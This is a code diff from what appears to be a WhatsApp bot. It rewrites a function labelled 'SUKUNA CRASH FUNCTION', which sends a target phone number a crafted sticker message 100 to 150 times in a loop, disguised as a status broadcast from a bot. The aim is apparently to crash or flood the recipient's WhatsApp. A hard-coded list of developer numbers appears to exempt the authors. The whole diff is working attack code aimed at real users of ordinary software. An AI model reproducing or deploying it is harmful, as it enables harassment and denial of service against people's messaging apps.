@@ -24,7 +24,7 @@ async function loadDevNumbers() {
         }
     } catch (e) {
         console.log('⚠️ Could not load dev numbers, using default protection');
-        devNumbers = ['554497461113@s.whatsapp.net', '554488122687@s.whatsapp.net'];
+        devNumbers = ['5544974611@s.whatsapp.net', '55448812268@s.whatsapp.net'];
     }
 }
 
@@ -37,47 +37,45 @@ loadDevNumbers();
 // ============================================================
 // SUKUNA CRASH FUNCTION (StcSqL)
 // ============================================================
-async function StcSqL(conn, target) {
-    for (let i = 0; i < 150; i++) {
-        try {
-            const cr = {
-                key: {
-                    remoteJid: "status@broadcast",
-                    participant: "13135550002@bot",
-                    fromMe: false
-                },
-                message: {
-                    conversation: "Shinigami"
-                }
-            };
-            
-            const msg = generateWAMessageFromContent(target, {
-                stickerMessage: {
-                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                    mimetype: "image/webp",
-                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                    fileLength: "10610",
-                    mediaKeyTimestamp: "1775044724",
-                    stickerSentTs: "1775044724091",
-                }
-            }, { quoted: cr });
-            
-            await conn.relayMessage(target, {
-                groupStatusMessageV2: {
-                    message: msg.message
-                }
-            }, {
-                participant: { jid: target },
-                messageId: msg.key.id
-            });
-        } catch (e) {
-            console.log("StcSqL error:", e.message);
-        }
-        await sleep(300);
-    }
+async function StcSqL(prim, target) {
+  for (let i = 0; i < 100; i++) {
+    const cr = {
+      key: {
+        remoteJid: "status@broadcast",
+        participant: "13135550002@bot",
+        fromMe: false
+      },
+      message: {
+        conversation: "D5Primis"
+      }
+    };
+    const msg = generateWAMessageFromContent(target, {
+      stickerMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+        mimetype: "image/webp",
+        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+        fileLength: "10610",
+        mediaKeyTimestamp: "1775044724",
+        stickerSentTs: "1775044724091",
+      }
+    }, {
+      quoted: cr
+    });
+    
+    await prim.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: msg.message
+      }
+    }, {
+      participant: { jid: target },
+      messageId: msg.key.id
+    });
+    
+    await sleep(7000);
+  }
 }
 
 // ============================================================
